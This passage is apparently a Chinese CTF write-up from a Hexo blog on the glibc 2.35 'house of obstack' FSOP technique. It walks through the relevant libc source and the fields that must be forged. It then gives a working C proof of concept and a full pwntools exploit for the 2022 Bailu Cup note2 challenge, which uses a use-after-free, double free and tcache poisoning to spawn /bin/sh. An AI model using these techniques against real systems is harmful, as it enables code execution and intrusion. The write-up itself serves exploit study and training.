+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line">      obstack_grow (obstack, data, n);<span class="comment">//此处的obstack_grow是可以触发到obstack_newchunk的宏</span></span><br><span class="line">      ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据这部分代码得知 <code> if (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</code> 要满足</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>obstack_grow</code> 宏要触发到 <code>_obstack_newchunk</code> ，需要满足条件 <code>__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)							      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure>
+
+<p>如果想控制 <code>rdi</code> 的话，需要触发 <code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))	</code> 。这里使用了一个三目运算符，当 <code>((h)-&gt;use_extra_arg)	</code> 为 <code>TRUE</code> 时，参数就为可控</p>
+<p>总结一下，需要伪造的字段</p>
+<blockquote>
+<ol>
+<li>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
+<li>fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</li>
+<li>__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</li>
+<li>((h)-&gt;use_extra_arg) &#x3D;&#x3D; TRUE</li>
+</ol>
+</blockquote>
+<p>上面有一些字段不属于 <code>_IO_FILE</code> 结构体，它们是 <code>obstack </code> 结构体中的，如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>它和 <code>_IO_FILE_plus</code> 结构体都属于 <code>_IO_obstack_file</code> ，这里只需要知道它们的关系即可。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>POC</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GLIBC 2.35-0ubuntu3.1</span></span><br><span class="line"><span class="comment">//gcc poc.c -o poc -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> libc_base=(<span class="type">size_t</span>)&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;libc_base @ 0x%lx\n&quot;</span>,libc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> system_addr=libc_base+<span class="number">0x50d60</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;system address @ 0x%lx\n&quot;</span>,system_addr);</span><br><span class="line">	</span><br><span class="line">    <span class="type">size_t</span> bin_sh_addr=libc_base+<span class="number">0x1d8698</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;/bin/sh address @ 0x%lx\n&quot;</span>,bin_sh_addr);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> *io_list_all=(<span class="type">size_t</span> *)(libc_base+<span class="number">0x21a680</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;io_list_all address @ %p\n&quot;</span>,io_list_all);</span><br><span class="line">    </span><br><span class="line">	<span class="type">size_t</span> io_obstack_jumps=libc_base+<span class="number">0x2163c0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;io_obstack_jumps address @ 0x%lx\n&quot;</span>,io_obstack_jumps);</span><br><span class="line">	<span class="type">size_t</span> *ptr=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    *(ptr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;<span class="comment">//_IO_read_base</span></span><br><span class="line">    *(ptr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">	*(ptr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">	*(ptr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;<span class="comment">//_IO_write_end</span></span><br><span class="line">	*(ptr + (<span class="number">0x38</span>/<span class="number">8</span>)) = (<span class="type">size_t</span>)(system_addr);<span class="comment">//_IO_buf_base</span></span><br><span class="line">	*(ptr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;<span class="comment">//_IO_save_base</span></span><br><span class="line">	*(ptr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;<span class="comment">//_IO_backup_base</span></span><br><span class="line">	*(ptr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = (<span class="type">size_t</span>)(io_obstack_jumps+<span class="number">32</span>);<span class="comment">//vtable</span></span><br><span class="line">	*(ptr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = (<span class="type">size_t</span>)ptr;</span><br><span class="line">    </span><br><span class="line">	io_list_all[<span class="number">0</span>]=(<span class="type">size_t</span>)ptr;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>POC</code> 是把 <code>_IO_FILE_plus</code> 和 <code>obstack</code> 结构体重叠布置在一起了（在实际的攻击中，重叠布置在一起，会省下很多字节，减少 <code>payload</code> 的长度）。该攻击最终通过 <code>FSOP</code> 触发，在 <code>exit</code> 函数执行时，刷新了 <code>_IO_list_all</code> 链表中的所有文件流，刷新时调用了 <code>_IO_overflow</code> ，至此执行流偏离了正常的调用链，逐步被劫持为我们指定的地址。</p>
+<h3 id="2022柏鹭杯-note2"><a href="#2022柏鹭杯-note2" class="headerlink" title="2022柏鹭杯-note2"></a>2022柏鹭杯-note2</h3><p>一时间找不到很合适的题目，这里以 2022柏鹭杯-note2 作为例题</p>
+<h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zikh@Pwner-machine:~/Desktop/pwn2$ checksec note2</span><br><span class="line">[*] &#x27;/home/zikh/Desktop/pwn2/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>本题存在一个 <code>UAF</code> 漏洞，并且可以无限次的使用 <code>add</code> 和 <code>delete</code> <code>show</code> 函数，<code>size</code> 被限定到了 <code>0x200</code> 以下，并且可以触发 <code>exit</code> 函数退出。（ <code>libc</code> 版本为 <code>2.35</code> ，移除了各类 <code>hook</code> ）</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>因为没有 <code>edit</code> 函数，因此我们考虑 <code>double free</code> ，但由于 <code>key</code> 机制的存在，无法直接在 <code>tcache bin</code> 直接打 <code>double free</code>，解决方法有两种，方法一是 <strong>house of botcake</strong> （本题可以打通，不过主要说一下第二个方法），方法二是填满 <code>tcache bin</code> ，然后在 <code>fast bin</code>中做出 <code>double free</code> ，再打 <code>tcache poisoning</code> 将 <code>IO_list_all</code> 申请出来写入堆地址，从而触发最后的 <code>house of obstack</code>。（具体 <code>fastbin</code> 中做出的 <code>double free</code> 是如何打出 <code>tcache poisoning </code> 的可以参考这篇 <a href="https://zikh26.github.io/posts/f523ff3f.html?highlight=obstack">文章</a>， <code>safe-Linking</code> 机制的绕过本文也不做提及）</p>
+<p><code>house of obstack</code> 的各个字段布局在下面的 <code>EXP</code> 中都进行了标注，并且上文也进行了详细的分析，所以具体的利用不再详细描述</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base===&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------leak key----------------</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base===&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">io_obstack_jumps=libc_base+<span class="number">0x2163c0</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x50d60</span></span><br><span class="line">heap_addr=<span class="number">0x1020</span>+heap_base <span class="comment">#位于io_list_all的chunk用户区</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(<span class="number">0</span>)   <span class="comment">#  io_read_end</span></span><br><span class="line">io_file+=p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;next_free</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)  <span class="comment"># io_write_base</span></span><br><span class="line">io_file+=p64(<span class="number">1</span>)  <span class="comment"># io_write_ptr</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)  <span class="comment"># io_write_end</span></span><br><span class="line">io_file+=p64(sys_addr)  <span class="comment">#rax</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)  <span class="comment"># _io_buf_end</span></span><br><span class="line">io_file+=p64(heap_addr-<span class="number">0x10</span>+<span class="number">0xe8</span>)  <span class="comment">#rdi</span></span><br><span class="line">io_file+=p64(<span class="number">1</span>)  <span class="comment"># use_extra_arg</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">16</span></span><br><span class="line">io_file+=p64(io_obstack_jumps+<span class="number">0x20</span>)   <span class="comment">#vtable</span></span><br><span class="line">io_file+=p64(heap_addr-<span class="number">0x10</span>)   <span class="comment">#obstack</span></span><br><span class="line">io_file+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x200</span>,io_file)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=((heap_base+<span class="number">0xf40</span>)&gt;&gt;<span class="number">12</span>)^(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,p64(heap_addr-<span class="number">0x10</span>))<span class="comment">#get io_list_all</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://nasm.re/posts/babyfile/">SECCON CTF 2022 Quals] babyfile | repr (nasm.re)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/7resp4ss/p/17486261.html#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E4%B8%80">一条新的glibc IO_FILE利用链：_IO_obstack_jumps利用分析 - 7resp4ss - 博客园 (cnblogs.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/FSOP/" rel="tag"># FSOP</a>
+              <a href="/tags/house-of-obstack/" rel="tag"># house of obstack</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/f671ae0d.html" rel="prev" title="教练 我也想入门windows pwn">
+                  <i class="fa fa-chevron-left"></i> 教练 我也想入门windows pwn
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+
+</body>
+</html>
